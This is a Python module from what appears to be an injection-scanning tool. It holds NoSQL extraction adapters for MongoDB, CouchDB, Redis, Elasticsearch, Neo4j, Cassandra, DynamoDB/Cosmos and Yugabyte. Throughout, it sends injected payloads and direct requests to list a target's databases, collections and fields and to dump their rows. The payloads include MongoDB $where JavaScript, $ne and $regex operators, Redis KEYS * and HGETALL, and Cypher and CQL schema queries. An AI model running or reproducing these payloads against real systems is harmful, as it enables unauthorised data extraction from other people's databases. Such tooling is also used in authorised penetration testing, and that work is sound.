from __future__ import annotations

import re
from collections.abc import Callable
from dataclasses import dataclass
from typing import Any

from stealthix.core.session import ScanSession


@dataclass(frozen=True)
class NoSQLAdapterCapabilities:
    backend: str
    family: str
    aliases: tuple[str, ...]
    operations: tuple[str, ...] = ("databases", "tables", "columns", "dump")
    direct_http: bool = False
    injected_payloads: bool = True
    fallback: bool = False

    def as_dict(self) -> dict[str, Any]:
        return {
            "backend": self.backend,
            "family": self.family,
            "aliases": list(self.aliases),
            "operations": list(self.operations),
            "direct_http": self.direct_http,
            "injected_payloads": self.injected_payloads,
            "fallback": self.fallback,
        }


@dataclass(frozen=True)
class NoSQLAdapterContext:
    result_base: Callable[[ScanSession, str, list[str] | None], dict[str, Any]]
    root_url: Callable[[ScanSession, str], str]
    request_direct: Callable[[ScanSession, str], tuple[str, str, float]]
    request_injected: Callable[[ScanSession, str], tuple[str, str, float]]
    json_payload: Callable[[str], Any | None]
    body_keys: Callable[[str], list[str]]
    strings_from_json: Callable[[str], list[str]]
    extract_values: Callable[[str, list[str] | None], list[str]]
    extract_rows: Callable[
        [str, list[str]], list[dict[str, Any] | list[Any] | str | list[list[str]]]
    ]
    response_entry: Callable[..., dict[str, Any]]
    record_success: Callable[[dict[str, Any], str], None]
    finalize_collection_result: Callable[[dict[str, Any], str], dict[str, Any]]
    finalize_rows_result: Callable[[dict[str, Any], str], dict[str, Any]]


class NoSQLExtractionAdapter:
    capabilities = NoSQLAdapterCapabilities(
        backend="generic",
        family="nosql",
        aliases=("generic",),
        fallback=True,
    )

    def _result(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        operation: str,
        payloads: list[str] | None = None,
    ) -> dict[str, Any]:
        result = ctx.result_base(session, operation, payloads)
        result["technique"] = "nosql-heuristic"
        result["adapter"] = self.capabilities.backend
        result["capabilities"] = self.capabilities.as_dict()
        return result

    def enumerate_databases(self, session: ScanSession, ctx: NoSQLAdapterContext) -> dict[str, Any]:
        result = self._result(session, ctx, "databases", [])
        result["databases"] = []
        result["warnings"].append(
            f"No specialized NoSQL extraction adapter for {backend_from_session(session) or 'auto'}."
        )
        return ctx.finalize_collection_result(result, "databases")

    def enumerate_tables(
        self, session: ScanSession, ctx: NoSQLAdapterContext, *, database: str | None = None
    ) -> dict[str, Any]:
        result = self._result(session, ctx, "tables", [])
        result["database"] = database
        result["tables"] = []
        result["warnings"].append(
            f"No specialized NoSQL extraction adapter for {backend_from_session(session) or 'auto'}."
        )
        return ctx.finalize_collection_result(result, "tables")

    def enumerate_columns(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str | None = None,
        database: str | None = None,
    ) -> dict[str, Any]:
        result = self._result(session, ctx, "columns", [])
        result["table"] = table
        result["database"] = database
        result["columns"] = []
        result["warnings"].append(
            f"No specialized NoSQL extraction adapter for {backend_from_session(session) or 'auto'}."
        )
        return ctx.finalize_collection_result(result, "columns")

    def dump_table(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str,
        columns: list[str],
        database: str | None = None,
    ) -> dict[str, Any]:
        result = self._result(session, ctx, "dump", [])
        result["table"] = table
        result["database"] = database
        result["columns"] = list(columns)
        result["rows"] = []
        result["warnings"].append(
            f"No specialized NoSQL extraction adapter for {backend_from_session(session) or 'auto'}."
        )
        return ctx.finalize_rows_result(result, "rows")


def _json_token_values(ctx: NoSQLAdapterContext, body: str) -> list[str]:
    return [
        item
        for item in ctx.strings_from_json(body)
        if re.fullmatch(r"[a-z0-9_\-:.]+", item, flags=re.IGNORECASE)
    ]


def _split_lines(body: str) -> list[str]:
    return [item.strip() for item in re.split(r"[\r\n,]+", body) if item.strip()]


class PayloadProfileAdapter(NoSQLExtractionAdapter):
    database_payloads: tuple[str, ...] = ()
    table_payloads: tuple[str, ...] = ()
    column_payloads: tuple[str, ...] = ()
    dump_payloads: tuple[str, ...] = ()
    database_patterns: tuple[str, ...] = ()
    table_patterns: tuple[str, ...] = ()
    column_patterns: tuple[str, ...] = ()

    def _format_payload(
        self, payload: str, *, database: str | None = None, table: str | None = None
    ) -> str:
        db_name = database or "db"
        table_name = table or "table"
        formatted = payload.replace("{database}", db_name).replace("{table}", table_name)
        formatted = re.sub(r"\bdatabase\b", db_name, formatted)
        formatted = re.sub(r"\bdb\b", db_name, formatted)
        formatted = re.sub(r"\bcollection\b", table_name, formatted)
        return re.sub(r"\btable\b", table_name, formatted)

    def _extract_collection(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        operation: str,
        key: str,
        payloads: tuple[str, ...],
        patterns: tuple[str, ...],
        database: str | None = None,
        table: str | None = None,
    ) -> dict[str, Any]:
        formatted = [
            self._format_payload(payload, database=database, table=table) for payload in payloads
        ]
        result = self._result(session, ctx, operation, list(formatted))
        if database is not None or operation in {"tables", "columns"}:
            result["database"] = database
        if table is not None or operation == "columns":
            result["table"] = table
        result[key] = []
        for payload in formatted:
            target, body, elapsed = ctx.request_injected(session, payload)
            result["responses"].append(
                ctx.response_entry(target, payload, body, elapsed, limit=8000)
            )
            extracted = ctx.extract_values(body, list(patterns))
            if not extracted:
                extracted = _json_token_values(ctx, body)
            if extracted:
                result[key].extend(extracted)
                ctx.record_success(result, payload)
        return ctx.finalize_collection_result(result, key)

    def enumerate_databases(self, session: ScanSession, ctx: NoSQLAdapterContext) -> dict[str, Any]:
        return self._extract_collection(
            session,
            ctx,
            operation="databases",
            key="databases",
            payloads=self.database_payloads,
            patterns=self.database_patterns,
        )

    def enumerate_tables(
        self, session: ScanSession, ctx: NoSQLAdapterContext, *, database: str | None = None
    ) -> dict[str, Any]:
        return self._extract_collection(
            session,
            ctx,
            operation="tables",
            key="tables",
            payloads=self.table_payloads,
            patterns=self.table_patterns,
            database=database,
        )

    def enumerate_columns(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str | None = None,
        database: str | None = None,
    ) -> dict[str, Any]:
        return self._extract_collection(
            session,
            ctx,
            operation="columns",
            key="columns",
            payloads=self.column_payloads,
            patterns=self.column_patterns,
            database=database,
            table=table,
        )

    def dump_table(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str,
        columns: list[str],
        database: str | None = None,
    ) -> dict[str, Any]:
        payloads = [
            self._format_payload(payload, database=database, table=table)
            for payload in self.dump_payloads
        ]
        result = self._result(session, ctx, "dump", list(payloads))
        result["table"] = table
        result["database"] = database
        result["columns"] = list(columns)
        result["rows"] = []
        for payload in payloads:
            target, body, elapsed = ctx.request_injected(session, payload)
            result["responses"].append(
                ctx.response_entry(target, payload, body, elapsed, limit=10000)
            )
            rows = ctx.extract_rows(body, columns)
            if not rows:
                parsed = ctx.json_payload(body)
                if isinstance(parsed, list):
                    rows = [
                        {column: item.get(column) for column in columns or item.keys()}
                        for item in parsed
                        if isinstance(item, dict)
                    ]
                elif isinstance(parsed, dict):
                    rows = [{column: parsed.get(column) for column in columns or parsed.keys()}]
            if rows:
                result["rows"].extend(rows)
                ctx.record_success(result, payload)
                break
        return ctx.finalize_rows_result(result, "rows")


class MongoDBAdapter(PayloadProfileAdapter):
    capabilities = NoSQLAdapterCapabilities(
        backend="mongodb", family="document", aliases=("mongodb", "mongo", "documentdb")
    )
    database_payloads = (
        '{"$where":"return db.getMongo().getDBNames().join(",")"}',
        '{"$where":"return db.getName()"}',
    )
    table_payloads = (
        '{"$where":"return db.getCollectionNames().join(",")"}',
        '{"$regex":".*"}',
    )
    column_payloads = (
        '{"$where":"return Object.keys(this).join(",")"}',
        '{"$where":"return JSON.stringify(Object.keys(this))"}',
        '{"$regex":".*"}',
    )
    dump_payloads = ('{"$regex":".*"}', '{"$ne":null}', '{"$where":"return true"}')
    database_patterns = (r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)")
    table_patterns = (r"\bcollection[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)")
    column_patterns = (r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)")


class CouchDBAdapter(NoSQLExtractionAdapter):
    capabilities = NoSQLAdapterCapabilities(
        backend="couchdb",
        family="document",
        aliases=("couchdb",),
        direct_http=True,
        injected_payloads=False,
    )

    def enumerate_databases(self, session: ScanSession, ctx: NoSQLAdapterContext) -> dict[str, Any]:
        result = self._result(session, ctx, "databases", [])
        result["databases"] = []
        url = ctx.root_url(session, "/_all_dbs")
        target, body, elapsed = ctx.request_direct(session, url)
        result["responses"].append(ctx.response_entry(target, url, body, elapsed))
        payload = ctx.json_payload(body)
        if isinstance(payload, list):
            result["databases"].extend(str(item) for item in payload if str(item).strip())
            ctx.record_success(result, url)
        return ctx.finalize_collection_result(result, "databases")

    def _database_name(
        self, session: ScanSession, ctx: NoSQLAdapterContext, database: str | None
    ) -> str | None:
        if database:
            return database
        databases = self.enumerate_databases(session, ctx).get("databases", [])
        return next(iter(databases), None)

    def enumerate_tables(
        self, session: ScanSession, ctx: NoSQLAdapterContext, *, database: str | None = None
    ) -> dict[str, Any]:
        result = self._result(session, ctx, "tables", [])
        result["database"] = database
        result["tables"] = []
        db_name = self._database_name(session, ctx, database)
        if not db_name:
            result["warnings"].append("Could not determine a CouchDB database name.")
            return ctx.finalize_collection_result(result, "tables")
        url = ctx.root_url(session, f"/{db_name}/_all_docs")
        target, body, elapsed = ctx.request_direct(session, url)
        result["responses"].append(ctx.response_entry(target, url, body, elapsed))
        payload = ctx.json_payload(body)
        if isinstance(payload, dict) and isinstance(payload.get("rows"), list):
            result["tables"].extend(
                str(item.get("id"))
                for item in payload["rows"]
                if isinstance(item, dict) and item.get("id")
            )
            ctx.record_success(result, url)
        return ctx.finalize_collection_result(result, "tables")

    def enumerate_columns(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str | None = None,
        database: str | None = None,
    ) -> dict[str, Any]:
        result = self._result(session, ctx, "columns", [])
        result["table"] = table
        result["database"] = database
        result["columns"] = []
        db_name = self._database_name(session, ctx, database)
        if not db_name:
            result["warnings"].append("Could not determine a CouchDB database name.")
            return ctx.finalize_collection_result(result, "columns")
        url = ctx.root_url(session, f"/{db_name}/_all_docs?include_docs=true")
        target, body, elapsed = ctx.request_direct(session, url)
        result["responses"].append(ctx.response_entry(target, url, body, elapsed, limit=8000))
        keys = ctx.body_keys(body)
        if keys:
            result["columns"].extend(keys)
            ctx.record_success(result, url)
        return ctx.finalize_collection_result(result, "columns")

    def dump_table(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str,
        columns: list[str],
        database: str | None = None,
    ) -> dict[str, Any]:
        result = self._result(session, ctx, "dump", [])
        result["table"] = table
        result["database"] = database
        result["columns"] = list(columns)
        result["rows"] = []
        db_name = self._database_name(session, ctx, database)
        if not db_name:
            result["warnings"].append("Could not determine a CouchDB database name.")
            return ctx.finalize_rows_result(result, "rows")
        url = ctx.root_url(session, f"/{db_name}/_all_docs?include_docs=true")
        target, body, elapsed = ctx.request_direct(session, url)
        result["responses"].append(ctx.response_entry(target, url, body, elapsed, limit=10000))
        payload = ctx.json_payload(body)
        if isinstance(payload, dict) and isinstance(payload.get("rows"), list):
            for item in payload["rows"]:
                if not isinstance(item, dict) or not isinstance(item.get("doc"), dict):
                    continue
                doc = item["doc"]
                row = {column: doc.get(column) for column in columns or doc.keys()}
                if any(value is not None and str(value).strip() for value in row.values()):
                    result["rows"].append(row)
            if result["rows"]:
                ctx.record_success(result, url)
        return ctx.finalize_rows_result(result, "rows")


class RedisAdapter(NoSQLExtractionAdapter):
    capabilities = NoSQLAdapterCapabilities(backend="redis", family="keyvalue", aliases=("redis",))

    def enumerate_databases(self, session: ScanSession, ctx: NoSQLAdapterContext) -> dict[str, Any]:
        payloads = ["INFO", "CONFIG GET databases"]
        result = self._result(session, ctx, "databases", list(payloads))
        result["databases"] = []
        for payload in payloads:
            target, body, elapsed = ctx.request_injected(session, payload)
            result["responses"].append(ctx.response_entry(target, payload, body, elapsed))
            names = re.findall(r"\b(db\d+)\s*:", body, flags=re.IGNORECASE)
            if not names and "redis_version" in body.lower():
                names = ["db0"]
            if names:
                result["databases"].extend(names)
                ctx.record_success(result, payload)
        return ctx.finalize_collection_result(result, "databases")

    def enumerate_tables(
        self, session: ScanSession, ctx: NoSQLAdapterContext, *, database: str | None = None
    ) -> dict[str, Any]:
        payload = "KEYS *"
        result = self._result(session, ctx, "tables", [payload])
        result["database"] = database
        result["tables"] = []
        target, body, elapsed = ctx.request_injected(session, payload)
        result["responses"].append(ctx.response_entry(target, payload, body, elapsed))
        extracted = [item for item in _split_lines(body) if not item.startswith("$")]
        if extracted:
            result["tables"].extend(extracted)
            ctx.record_success(result, payload)
        return ctx.finalize_collection_result(result, "tables")

    def enumerate_columns(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str | None = None,
        database: str | None = None,
    ) -> dict[str, Any]:
        result = self._result(session, ctx, "columns", [])
        result["table"] = table
        result["database"] = database
        result["columns"] = []
        if not table:
            result["warnings"].append("Redis column extraction requires a key name.")
            return ctx.finalize_collection_result(result, "columns")
        payloads = [f"HKEYS {table}", f"HGETALL {table}"]
        result["payloads"] = list(payloads)
        for payload in payloads:
            target, body, elapsed = ctx.request_injected(session, payload)
            result["responses"].append(ctx.response_entry(target, payload, body, elapsed))
            extracted = _split_lines(body)
            if payload.startswith("HGETALL"):
                extracted = extracted[::2]
            if extracted:
                result["columns"].extend(extracted)
                ctx.record_success(result, payload)
        return ctx.finalize_collection_result(result, "columns")

    def dump_table(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str,
        columns: list[str],
        database: str | None = None,
    ) -> dict[str, Any]:
        payloads = [f"HGETALL {table}", f"GET {table}"]
        result = self._result(session, ctx, "dump", list(payloads))
        result["table"] = table
        result["database"] = database
        result["columns"] = list(columns)
        result["rows"] = []
        for payload in payloads:
            target, body, elapsed = ctx.request_injected(session, payload)
            result["responses"].append(
                ctx.response_entry(target, payload, body, elapsed, limit=8000)
            )
            if payload.startswith("HGETALL"):
                parts = _split_lines(body)
                if len(parts) >= 2:
                    row = {parts[index]: parts[index + 1] for index in range(0, len(parts) - 1, 2)}
                    if columns:
                        row = {column: row.get(column) for column in columns}
                    result["rows"].append(row)
                    ctx.record_success(result, payload)
                    break
            elif body.strip():
                result["rows"].append({columns[0] if columns else "value": body.strip()})
                ctx.record_success(result, payload)
                break
        return ctx.finalize_rows_result(result, "rows")


class SearchAdapter(NoSQLExtractionAdapter):
    capabilities = NoSQLAdapterCapabilities(
        backend="search",
        family="search",
        aliases=("elasticsearch", "opensearch"),
        direct_http=True,
    )

    def _search_names(self, ctx: NoSQLAdapterContext, body: str) -> list[str]:
        payload = ctx.json_payload(body)
        names: list[str] = []
        if isinstance(payload, dict):
            names.extend(str(key) for key in payload.keys() if not str(key).startswith("_"))
        elif isinstance(payload, list):
            for item in payload:
                if isinstance(item, dict):
                    names.extend(
                        str(item[key])
                        for key in ("index", "name", "key")
                        if item.get(key) and not str(item.get(key)).startswith(".")
                    )
        if names:
            return names
        for line in body.splitlines():
            parts = line.split()
            if parts and parts[0].lower() not in {"health", "status", "index"}:
                names.append(
                    parts[2]
                    if len(parts) > 2 and parts[0] in {"green", "yellow", "red"}
                    else parts[0]
                )
        return names

    def enumerate_databases(self, session: ScanSession, ctx: NoSQLAdapterContext) -> dict[str, Any]:
        urls = [
            ctx.root_url(session, "/_cat/indices?format=json"),
            ctx.root_url(session, "/_aliases"),
        ]
        result = self._result(session, ctx, "databases", list(urls))
        result["databases"] = []
        for url in urls:
            target, body, elapsed = ctx.request_direct(session, url)
            result["responses"].append(ctx.response_entry(target, url, body, elapsed, limit=8000))
            names = self._search_names(ctx, body)
            if names:
                result["databases"].extend(names)
                ctx.record_success(result, url)
        return ctx.finalize_collection_result(result, "databases")

    def enumerate_tables(
        self, session: ScanSession, ctx: NoSQLAdapterContext, *, database: str | None = None
    ) -> dict[str, Any]:
        result = self.enumerate_databases(session, ctx)
        result["operation"] = "tables"
        result["database"] = database
        result["tables"] = result.pop("databases", [])
        return ctx.finalize_collection_result(result, "tables")

    def enumerate_columns(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str | None = None,
        database: str | None = None,
    ) -> dict[str, Any]:
        path = f"/{table}/_mapping" if table else "/_mapping"
        url = ctx.root_url(session, path)
        result = self._result(session, ctx, "columns", [url])
        result["table"] = table
        result["database"] = database
        result["columns"] = []
        target, body, elapsed = ctx.request_direct(session, url)
        result["responses"].append(ctx.response_entry(target, url, body, elapsed, limit=10000))
        keys = ctx.body_keys(body)
        if keys:
            result["columns"].extend(keys)
            ctx.record_success(result, url)
        return ctx.finalize_collection_result(result, "columns")

    def dump_table(
        self,
        session: ScanSession,
        ctx: NoSQLAdapterContext,
        *,
        table: str,
        columns: list[str],
        database: str | None = None,
    ) -> dict[str, Any]:
        url = ctx.root_url(session, f"/{table}/_search")
        result = self._result(session, ctx, "dump", [url])
        result["table"] = table
        result["database"] = database
        result["columns"] = list(columns)
        result["rows"] = []
        target, body, elapsed = ctx.request_direct(session, url)
        result["responses"].append(ctx.response_entry(target, url, body, elapsed, limit=10000))
        payload = ctx.json_payload(body)
        hits = payload.get("hits", {}).get("hits", []) if isinstance(payload, dict) else []
        if isinstance(hits, list):
            for hit in hits:
                source = hit.get("_source") if isinstance(hit, dict) else None
                if isinstance(source, dict):
                    result["rows"].append(
                        {column: source.get(column) for column in columns or source.keys()}
                    )
        if not result["rows"]:
            result["rows"].extend(ctx.extract_rows(body, columns))
        if result["rows"]:
            ctx.record_success(result, url)
        return ctx.finalize_rows_result(result, "rows")


class Neo4jAdapter(PayloadProfileAdapter):
    capabilities = NoSQLAdapterCapabilities(
        backend="neo4j", family="graph", aliases=("neo4j", "janusgraph", "neptune")
    )
    database_payloads = ("SHOW DATABASES", "CALL dbms.listDatabases()")
    table_payloads = ("CALL db.labels()", "MATCH (n) RETURN DISTINCT labels(n)")
    column_payloads = ("MATCH (n) RETURN keys(n) LIMIT 1", "CALL db.schema.nodeTypeProperties()")
    dump_payloads = ("MATCH (n) WHERE 1=1 RETURN n", "MATCH (n) RETURN n")
    database_patterns = (r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)")
    table_patterns = (r"\blabel[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)")
    column_patterns = (r"\bproperty[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)")


class CassandraAdapter(PayloadProfileAdapter):
    capabilities = NoSQLAdapterCapabilities(
        backend="cassandra", family="wide-column", aliases=("cassandra", "scylla", "scylladb")
    )
    database_payloads = ("SELECT keyspace_name FROM system_schema.keyspaces", "DESCRIBE KEYSPACES")
    table_payloads = (
        "SELECT table_name FROM system_schema.tables WHERE keyspace_name='database'",
        "DESCRIBE TABLES",
    )
    column_payloads = (
        "SELECT column_name FROM system_schema.columns WHERE keyspace_name='database' AND table_name='table'",
        "DESCRIBE table",
    )
    dump_payloads = ("SELECT * FROM table LIMIT 20", "SELECT * FROM database.table LIMIT 20")
    database_patterns = (
        r"\bkeyspace(?:_name)?[:=\s]+([a-z0-9_\-]+)",
        r"\bdatabase[:=\s]+([a-z0-9_\-]+)",
    )
    table_patterns = (r"\btable(?:_name)?[:=\s]+([a-z0-9_\-]+)",)
    column_patterns = (r"\bcolumn(?:_name)?[:=\s]+([a-z0-9_\-]+)",)


class DynamoCosmosAdapter(PayloadProfileAdapter):
    capabilities = NoSQLAdapterCapabilities(
        backend="dynamodb-cosmosdb",
        family="multimodel",
        aliases=("dynamodb", "cosmosdb", "cosmos", "azure-cosmos-db"),
    )
    database_payloads = (
        "SELECT * FROM c WHERE c.type = 'database'",
        "LIST TABLES",
    )
    table_payloads = (
        "SELECT * FROM c WHERE c.type = 'container'",
        "LIST TABLES",
    )
    column_payloads = ("SELECT * FROM c LIMIT 1", "SCAN table LIMIT 1")
    dump_payloads = ("SELECT * FROM c WHERE 1=1", "SCAN table")
    database_patterns = (r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)")
    table_patterns = (r"\bcontainer[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)")
    column_patterns = (r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)")


class YugabyteYCQLAdapter(CassandraAdapter):
    capabilities = NoSQLAdapterCapabilities(
        backend="yugabyte-ycql",
        family="newsql-wide-column",
        aliases=("yugabyte", "yugabytedb", "ycql", "yugabyte-ycql", "yugabyte_ycql"),
    )


class ConservativeFallbackAdapter(MongoDBAdapter):
    capabilities = NoSQLAdapterCapabilities(
        backend="generic",
        family="nosql",
        aliases=("generic", "auto", ""),
        fallback=True,
    )


_ADAPTERS: tuple[NoSQLExtractionAdapter, ...] = (
    MongoDBAdapter(),
    CouchDBAdapter(),
    RedisAdapter(),
    SearchAdapter(),
    Neo4jAdapter(),
    CassandraAdapter(),
    DynamoCosmosAdapter(),
    YugabyteYCQLAdapter(),
)
_FALLBACK = ConservativeFallbackAdapter()


def backend_from_session(session: ScanSession) -> str:
    plugin = session.metadata.get("plugin")
    plugin_name = plugin.get("dbms") or plugin.get("name") if isinstance(plugin, dict) else None
    return str(session.config.dbms or plugin_name or "").strip().lower()


def adapter_for_backend(backend: str | None) -> NoSQLExtractionAdapter:
    normalized = str(backend or "").strip().lower()
    for adapter in _ADAPTERS:
        if normalized in adapter.capabilities.aliases:
            return adapter
    return _FALLBACK


def adapter_for_session(session: ScanSession) -> NoSQLExtractionAdapter:
    return adapter_for_backend(backend_from_session(session))


__all__ = [
    "NoSQLAdapterCapabilities",
    "NoSQLAdapterContext",
    "NoSQLExtractionAdapter",
    "adapter_for_backend",
    "adapter_for_session",
    "backend_from_session",
]
